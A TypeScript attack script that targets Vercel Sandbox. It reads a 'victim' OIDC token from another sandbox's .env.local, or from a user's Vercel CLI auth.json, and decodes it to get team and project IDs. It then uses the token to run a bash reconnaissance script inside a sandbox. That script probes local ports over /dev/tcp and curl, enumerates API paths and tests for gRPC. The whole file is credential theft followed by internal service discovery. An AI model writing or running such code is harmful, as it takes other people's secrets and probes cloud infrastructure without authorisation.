import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon-1787251919562", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "===== probe local ports 7531-7533, 23456 ==="
for p in 7531 7532 7533 23456; do
  echo "--- port $p ---"
  # plain GET
  timeout 2 bash -c "exec 3<>/dev/tcp/127.0.0.1/$p && printf 'GET / HTTP/1.0\\r\\n\\r\\n' >&3 && timeout 1 head -c 300 <&3" 2>&1 | head -5
  echo "  (http attempt above)"
done
echo "===== HTTP methods / paths on 7531 ==="
for path in / /health /status /api /metrics /info /version /debug /sandbox; do
  code=$(timeout 2 curl -s -o /tmp/out -w '%{http_code}' --max-time 2 "http://127.0.0.1:7531$path" 2>/dev/null)
  body=$(head -c 100 /tmp/out 2>/dev/null)
  echo "7531 $path -> $code | $body"
done
echo "===== HEAD / OPTIONS on 7531 ==="
timeout 2 curl -s -X OPTIONS -i --max-time 2 "http://127.0.0.1:7531/" 2>&1 | head -8
echo "===== grpc? http2 preface test on 7531 ==="
timeout 2 bash -c "printf 'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n' > /dev/tcp/127.0.0.1/7531" 2>&1 && echo "connected" || echo "no connect"
echo "===== DONE ====="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });